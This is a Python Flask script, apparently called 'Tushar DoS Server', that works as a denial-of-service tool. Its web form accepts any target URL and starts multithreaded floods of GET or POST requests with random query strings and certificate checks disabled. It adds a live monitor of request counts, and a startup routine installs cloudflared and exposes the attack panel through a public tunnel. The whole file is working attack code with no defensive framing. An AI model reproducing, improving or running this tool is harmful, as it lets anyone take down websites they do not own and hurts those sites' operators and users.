#!/usr/bin/env python3

from flask import Flask, request, jsonify
from multiprocessing import Manager
import threading
import time
import random
import ssl
import http.client
import urllib.parse
import subprocess
import os
import shutil
import re

app = Flask(__name__)

DEBUG = False
SSLVERIFY = True

METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 100

manager = Manager()
shared_counter = manager.list([0, 0])  # [success, failed]
workers = []


class DoSWorker(threading.Thread):
    def __init__(self, url, sockets, method, counter):
        threading.Thread.__init__(self)
        self.url = url
        self.sockets = sockets
        self.method = method
        self.counter = counter
        self.running = True

        parsed = urllib.parse.urlparse(url)
        self.ssl = parsed.scheme == 'https'
        self.host = parsed.hostname
        self.path = parsed.path if parsed.path else "/"
        self.port = parsed.port or (443 if self.ssl else 80)

    def run(self):
        while self.running:
            try:
                conns = []
                for _ in range(self.sockets):
                    if self.ssl:
                        conn = http.client.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
                    else:
                        conn = http.client.HTTPConnection(self.host, self.port)
                    conns.append(conn)

                for conn in conns:
                    path = self.path + "?" + self.random_query()
                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
                    headers = {
                        'User-Agent': self.random_ua(),
                        'Connection': 'keep-alive'
                    }
                    conn.request(method.upper(), path, None, headers)

                for conn in conns:
                    try:
                        conn.getresponse()
                        self.counter[0] += 1
                    except:
                        self.counter[1] += 1
                    conn.close()

            except Exception as e:
                self.counter[1] += 1
                if DEBUG:
                    print(f"Error: {e}")

    def stop(self):
        self.running = False

    def random_query(self):
        return "&".join(
            f"{self.randstr(5)}={self.randstr(8)}" for _ in range(random.randint(1, 3))
        )

    def randstr(self, length):
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))

    def random_ua(self):
        return "Mozilla/5.0 (compatible; GoldenEye DoS)"


@app.route('/')
def index():
    return '''
    <html>
    <head>
        <title>Tushar DoS Server</title>
        <style>
            body {
                background-color: #0f0f0f;
                color: #f0f0f0;
                font-family: Arial, sans-serif;
                text-align: center;
                padding-top: 50px;
            }
            input, select {
                padding: 10px;
                margin: 10px;
                font-size: 1rem;
                border-radius: 5px;
                border: none;
                width: 250px;
            }
            input[type="submit"] {
                background-color: #4CAF50;
                color: white;
                cursor: pointer;
                transition: 0.3s;
            }
            input[type="submit"]:hover {
                background-color: #45a049;
            }
            .rainbow {
                font-weight: bold;
                font-size: 24px;
                animation: rainbow 3s infinite linear;
            }
            @keyframes rainbow {
                0%{color:red;}
                14%{color:orange;}
                28%{color:yellow;}
                42%{color:green;}
                57%{color:blue;}
                71%{color:indigo;}
                85%{color:violet;}
                100%{color:red;}
            }
            .footer {
                margin-top: 50px;
                font-size: 18px;
            }
        </style>
    </head>
    <body>
        <h2>🔥 Welcome to <span class="rainbow">Tushar DoS Server</span> 🔥</h2>
        <form method="post" action="/attack">
            <input name="url" type="text" placeholder="Target URL (http:// or https://)" required /><br />
            <input name="workers" type="number" value="10" min="1" placeholder="Number of Workers" /><br />
            <input name="sockets" type="number" value="100" min="1" placeholder="Sockets per Worker" /><br />
            <select name="method">
                <option value="get">GET</option>
                <option value="post">POST</option>
                <option value="random">RANDOM</option>
            </select><br />
            <input type="submit" value="🚀 Start Attack" />
        </form>

        <div class="footer">
            Made with ❤️ by <span class="rainbow">Tushar</span>
        </div>
    </body>
    </html>
    '''


@app.route('/attack', methods=['POST'])
def attack():
    url = request.form.get('url')
    workers_num = int(request.form.get('workers', DEFAULT_WORKERS))
    sockets = int(request.form.get('sockets', DEFAULT_SOCKETS))
    method = request.form.get('method', METHOD_GET)

    if not url or not url.startswith('http'):
        return jsonify({'error': 'Invalid URL'}), 400

    global workers, shared_counter
    shared_counter[0] = 0
    shared_counter[1] = 0
    workers = []

    for _ in range(workers_num):
        w = DoSWorker(url, sockets, method, shared_counter)
        w.start()
        workers.append(w)

    return jsonify({'status': 'attack started', 'url': url, 'workers': workers_num, 'sockets': sockets})


@app.route('/monitor')
def monitor():
    return f'''
    <html>
    <head>
        <title>Monitor</title>
        <meta http-equiv="refresh" content="3">
        <style>
            body {{
                background-color: #1a1a1a;
                color: #00ffcc;
                font-family: monospace;
                text-align: center;
                padding-top: 40px;
            }}
        </style>
    </head>
    <body>
        <h1>📈 Tushar Server Monitor</h1>
        <p>✅ Successful Requests: {shared_counter[0]}</p>
        <p>❌ Failed Requests: {shared_counter[1]}</p>
        <p>👷 Workers Alive: {sum(1 for w in workers if w.is_alive())}</p>
    </body>
    </html>
    '''


@app.route('/stop')
def stop():
    for w in workers:
        w.stop()
    return jsonify({'status': 'stopping all workers'})


# =============== TUNNEL SETUP ===================

def install_cloudflared():
    if not shutil.which("cloudflared"):
        print("[*] Installing cloudflared...")
        subprocess.run([
            "curl", "-L", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
            "-o", "cloudflared"
        ])
        subprocess.run(["chmod", "+x", "cloudflared"])
        subprocess.run(["sudo", "mv", "cloudflared", "/usr/local/bin/"])


def start_tunnel():
    print("[*] Starting Cloudflare tunnel...")
    log_path = "/tmp/cloudflared.log"
    subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:8080"],
        stdout=open(log_path, "w"),
        stderr=subprocess.STDOUT
    )
    return log_path


def get_tunnel_url(log_path):
    print("[*] Waiting for public tunnel URL...")
    for _ in range(20):
        time.sleep(2)
        if os.path.exists(log_path):
            with open(log_path, "r") as f:
                content = f.read()
                match = re.search(r"(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)", content)
                if match:
                    print(f"[+] Public Tunnel URL: {match.group(1)}")
                    return match.group(1)
    print("[-] Tunnel URL not found.")
    return None


# =============== MAIN ENTRY POINT ===================
if __name__ == '__main__':
    install_cloudflared()
    log_file = start_tunnel()
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080), daemon=True).start()
    get_tunnel_url(log_file)
    while True:
        time.sleep(1)
